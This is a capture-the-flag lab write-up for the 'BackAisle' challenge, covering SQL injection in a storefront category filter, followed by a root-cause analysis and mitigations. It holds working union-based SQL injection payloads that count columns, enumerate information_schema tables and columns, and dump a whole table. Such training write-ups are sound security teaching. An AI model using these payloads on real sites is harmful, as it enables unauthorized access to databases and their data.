---
title: "SQL Injection Leads to Hidden Product Data Disclosure | BackAisle"
date: 2026-06-18 02:00:00 +0530
categories: [A05 - Injection, SQL Injection]
tags: [sqli, union-sqli, information-disclosure, mysql, webverselabs-pro, backaisle]
platform: WebVerse Pro
author: Shivansh Sharma
image:
  path: /assets/images/posts/backaisle-sqli.webp
  alt: BackAisle SQL Injection
---

## Lab Link

[BackAisle](https://dashboard.webverselabs-pro.com/challenges/back-aisle)

## Overview

BackAisle is a WebVerse Pro challenge focused on SQL Injection in a storefront category filter. The application used a public product grid to show released items, but a hidden friends-and-family capsule program existed in the same product table.

The vulnerable category filter allowed direct SQL injection. By manipulating the `category` parameter, I was able to bypass the intended visibility rule, enumerate the database, dump product metadata, and retrieve the hidden flag from the response.

## Objective

The goal was to find hidden product data that was not visible on the public storefront grid and retrieve the challenge flag.

## Vulnerability Identification

The challenge briefing gave a strong hint toward the category filter:

> The category filter on the shop page was the kind of throwaway code you write at 2am with a deadline tomorrow — quick, direct, never revisited.

The shop endpoint accepted a `category` parameter:

```http
GET /shop.php?category=jackets HTTP/1.1
Host: <LAB_HOST>
```

Testing the parameter with a SQL injection payload confirmed that the input was being inserted into a SQL query without proper parameterization.

## Recon / Approach

The first step was to confirm whether the category filter could be abused to alter the backend query logic.

I used a URL-encoded boolean SQL injection payload:

```http
GET /shop.php?category=jackets'+or+1%3d1--+ HTTP/1.1
Host: <LAB_HOST>
```

The response returned products from all categories, confirming that the `category` parameter was vulnerable to SQL Injection.

This behavior suggested that the backend query was likely similar to:

```sql
SELECT * FROM products
WHERE category = '<user_input>'
AND released = 1;
```

By injecting `OR 1=1` and commenting out the rest of the query, the visibility restriction could be bypassed.

## Exploitation

### Confirming SQL Injection

The following payload returned all category products:

```http
GET /shop.php?category=jackets'+or+1%3d1--+ HTTP/1.1
Host: <LAB_HOST>
```

The key part of the payload was:

```sql
' OR 1=1-- -
```

This forced the query condition to evaluate as true and ignored the remaining SQL logic.

### Finding the Column Count

Next, I used `ORDER BY` testing to identify the number of columns returned by the query.

```sql
' ORDER BY 5-- -
' ORDER BY 6-- -
' ORDER BY 7-- -
```

The valid column count was found to be:

```text
7
```

This meant a `UNION SELECT` payload needed seven columns.

### Finding a Reflected Column

After finding the column count, I tested which column was reflected in the page by injecting database information:

```sql
' UNION SELECT 1,database(),3,4,5,6,7-- -
```

The database name was returned in the response:

```text
yardlines
```

### Enumerating Tables

With a working reflected column, I enumerated tables from `information_schema.tables`:

```sql
' UNION SELECT 1,table_name,3,4,5,6,7
FROM information_schema.tables
WHERE table_schema='yardlines'-- -
```

The discovered tables were:

```text
journal
products
```

The `products` table was the most interesting because the challenge description mentioned hidden capsule pieces in the storefront data.

### Enumerating Product Columns

I then enumerated the column names from the `products` table:

```http
GET /shop.php?category='+UNION+SELECT+1,GROUP_CONCAT(column_name),3,4,5,6,7+FROM+information_schema.columns+WHERE+table_name='products'+AND+table_schema=database()--+- HTTP/1.1
Host: <LAB_HOST>
```

The response revealed the following columns:

```text
id, slug, name, category, drop_name, drop_date, price_cents, fabric, origin, sizes, image, description, released, badge
```

### Dumping Product Data

Finally, I dumped product rows by concatenating all important columns into a single reflected column:

```http
GET /shop.php?category='+UNION+SELECT+1,CONCAT(id,'|',slug,'|',name,'|',category,'|',drop_name,'|',drop_date,'|',price_cents,'|',fabric,'|',origin,'|',sizes,'|',image,'|',description,'|',released,'|',badge),3,4,5,6,7+FROM+products--+- HTTP/1.1
Host: <LAB_HOST>
```

This returned all product data, including hidden capsule entries that were not visible in the normal public grid.

## Proof / Flag

The flag was exposed in the response after dumping the `products` table data:

```text
WEBVERSE{...}
```

The exact flag is intentionally redacted.

## Root Cause

The root cause was unsafe string concatenation in the SQL query handling the `category` filter.

Instead of using parameterized queries, the application appeared to place user-controlled input directly into a SQL statement. This allowed an attacker to break out of the intended string context and modify the query logic.

The hidden capsule visibility rule was also enforced only through the same query path, which meant SQL Injection could bypass it completely.

## Impact

An attacker could:

- Bypass category and visibility filters
- View unreleased or hidden products
- Enumerate the database name
- Enumerate tables and columns
- Dump sensitive product metadata
- Retrieve the hidden challenge flag

In a real application, the same issue could expose private inventory, internal launch data, unreleased product details, customer records, or administrative secrets depending on database permissions.

## Mitigation

To fix this issue:

- Use prepared statements and parameterized queries for all database access.
- Never concatenate user input directly into SQL queries.
- Validate category values against an allowlist of known categories.
- Enforce visibility rules server-side using safe query logic.
- Avoid exposing database errors or raw query behavior to users.
- Use a database account with the minimum required privileges.
- Add automated security tests for filters and search endpoints.

A safer query pattern would be:

```sql
SELECT * FROM products
WHERE category = ?
AND released = 1;
```

## Lessons Learned

BackAisle demonstrates how a simple category filter can become a full database disclosure issue when user input is trusted inside SQL queries.

The important lesson is that visibility rules are not security controls if an attacker can modify the query that enforces them. Even low-risk storefront filters should be treated as untrusted input and handled with parameterized queries.
